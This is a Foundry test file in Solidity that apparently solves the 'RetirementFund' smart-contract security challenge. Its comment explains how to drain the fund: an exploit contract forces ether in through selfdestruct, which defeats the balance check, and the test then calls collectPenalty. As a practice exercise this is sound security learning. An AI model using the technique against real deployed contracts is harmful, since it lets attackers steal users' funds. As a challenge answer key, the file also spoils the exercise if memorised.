// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/RetirementFund.sol";

contract RetirementFundTest is Test {
    RetirementFund public retirementFund;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        retirementFund = (new RetirementFund){value: 1 ether}(address(this));
        exploitContract = new ExploitContract(retirementFund);
    }

    /**
        The core logic of the retirementFund is the player can withdraw the RetirementFund's Penalty if the owner withdraw before expiration.
        The question is even the owner doesn't withdraw before expiration, the play also have the way to withdraw RetirementFund's all eth balance.
        Just skip two checks:
        1: require(withdrawn > 0); use selfdestruct to make the RetirementFund's eth balance greater than startBalance, so the withdrawn will greater than 0 
        even the owner doesn't withdraw before expiration.
        2: require(msg.sender == beneficiary);  then let the player call collectPenalty()
    
     */
    function testIncrement() public {
        vm.deal(address(exploitContract), 1 ether);
        // Test your Exploit Contract below
        // Use the instance retirementFund and exploitContract

        // Put your solution here
        exploitContract.exploit();
        vm.prank(address(this));
        retirementFund.collectPenalty();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(retirementFund.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
